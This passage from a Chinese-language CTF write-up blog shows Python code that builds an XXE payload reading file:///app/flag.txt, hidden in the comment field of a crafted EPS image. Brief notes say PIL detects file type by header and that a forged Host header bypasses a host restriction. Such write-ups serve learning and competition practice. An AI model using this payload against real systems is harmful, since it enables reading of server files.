<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">comment </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&quot;&quot;&lt;!DOCTYPE b [&lt;!ENTITY xxe SYSTEM  &quot;file:///app/flag.txt&quot;&gt;]&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">&lt;name&gt;&amp;xxe;&lt;/name&gt;&quot;&quot;&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;\n&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27; &#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EXAMPLE_EPS </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&quot;&quot;%!PS-Adobe-3.0 EPSF-3.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">%%Creator: PIL 0.1 EpsEncode</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">%%BoundingBox: 0 0 3 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">%%Pages: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">%%Comment: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">comment</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">%%EndComments</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">%%Page: 1 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">%ImageData: 3 3 8 1 0 1 1 &quot;image&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">gsave</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">10 dict begin</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">/buf 3 string def</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">3 3 scale</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">3 3 8</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">[3 0 0 -3 0 3]</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">{{ currentfile buf readhexstring pop }} bind</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">image</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">000000000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">%%%%EndBinary</span><br></span><span class="token-line" style="color:#393A34"><span class="token string-interpolation string" style="color:#e3116c">grestore end&quot;&quot;&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>PIL读取图片是看图片头内容而不看扩展名的，所以以任何格式传上去都可以。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="925-update">9.25 update<a href="#925-update" class="hash-link" aria-label="9.25 update的直接链接" title="9.25 update的直接链接">​</a></h4>
<blockquote>
<p>参考<a href="https://www.ctfiot.com/206569.html" target="_blank" rel="noopener noreferrer">狼组的WP</a>:
这个题手写报文可以把Host写成任意服务器，所以就完全绕过了它对Host的限制。
应该属于非预期。不过目前我手头也没有云服务器所以也确实只能打这个</p>
</blockquote></div><footer class="docusaurus-mt-lg"><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a title="Catch-The-Flag contests writeups / learning notes" class="tag_zVej tagRegular_sFm0" href="/ctf-writeup/tags/ctf">CTF</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="博文分页导航"><a class="pagination-nav__link pagination-nav__link--prev" href="/ctf-writeup/2024/10/11/geekgame4-writeup"><div class="pagination-nav__sublabel">较新一篇</div><div class="pagination-nav__label">GeekGame4 Writeup</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/ctf-writeup/2024/06/24/GoogleCTF2024"><div class="pagination-nav__sublabel">较旧一篇</div><div class="pagination-nav__label">Google CTF 2024 Writeup</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#crypto" class="table-of-contents__link toc-highlight">Crypto</a><ul><li><a href="#idk-cipher--bg" class="table-of-contents__link toc-highlight">idk cipher / bg</a></li><li><a href="#bigger-is-better--bg" class="table-of-contents__link toc-highlight">bigger is better / bg</a></li><li><a href="#bit-by-bit--ez" class="table-of-contents__link toc-highlight">bit by bit / ez</a></li></ul></li><li><a href="#forensic" class="table-of-contents__link toc-highlight">Forensic</a><ul><li><a href="#simple-exfiltration--ez" class="table-of-contents__link toc-highlight">simple exfiltration / ez</a></li><li><a href="#bad-blood--ez--failed" class="table-of-contents__link toc-highlight">bad blood / ez / failed</a></li><li><a href="#slingshot--nm" class="table-of-contents__link toc-highlight">slingshot / nm</a></li></ul></li><li><a href="#pwn" class="table-of-contents__link toc-highlight">pwn</a><ul><li><a href="#not-so-shrimple-is-it--bg" class="table-of-contents__link toc-highlight">not so shrimple is it / bg</a></li><li><a href="#navigator--ez" class="table-of-contents__link toc-highlight">navigator / ez</a></li><li><a href="#shellcrunch--ez" class="table-of-contents__link toc-highlight">shellcrunch / ez</a></li><li><a href="#flight-script--nm" class="table-of-contents__link toc-highlight">flight script / nm</a></li><li><a href="#strings-only--hd" class="table-of-contents__link toc-highlight">strings only / hd</a></li></ul></li><li><a href="#rev" class="table-of-contents__link toc-highlight">rev</a><ul><li><a href="#revioli-revioli-revioli--ez" class="table-of-contents__link toc-highlight">revioli, revioli, revioli / ez</a></li><li><a href="#password-protecter--ez" class="table-of-contents__link toc-highlight">password protecter / ez</a></li><li><a href="#packed-full-of-surprise--ez" class="table-of-contents__link toc-highlight">Packed Full Of Surprise / ez</a></li><li><a href="#ai-prng--ez" class="table-of-contents__link toc-highlight">AI? PRNG / ez</a></li></ul></li><li><a href="#misc" class="table-of-contents__link toc-highlight">misc</a><ul><li><a href="#making-baking-pancakes--ez" class="table-of-contents__link toc-highlight">Making Baking Pancakes / ez</a></li><li><a href="#really-only-echo--ez" class="table-of-contents__link toc-highlight">Really Only Echo / ez</a></li></ul></li><li><a href="#web" class="table-of-contents__link toc-highlight">web</a><ul><li><a href="#giraffe-notes--ez" class="table-of-contents__link toc-highlight">giraffe notes / ez</a></li><li><a href="#open-seasame--ez" class="table-of-contents__link toc-highlight">open seasame / ez</a></li><li><a href="#impersonate--nm" class="table-of-contents__link toc-highlight">impersonate / nm</a></li><li><a href="#blob--nm" class="table-of-contents__link toc-highlight">blob / nm</a></li><li><a href="#dogdays--nm" class="table-of-contents__link toc-highlight">dogdays / nm</a></li><li><a href="#domdom--nm" class="table-of-contents__link toc-highlight">domdom / nm</a></li></ul></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/intro">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/RibomBalt" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>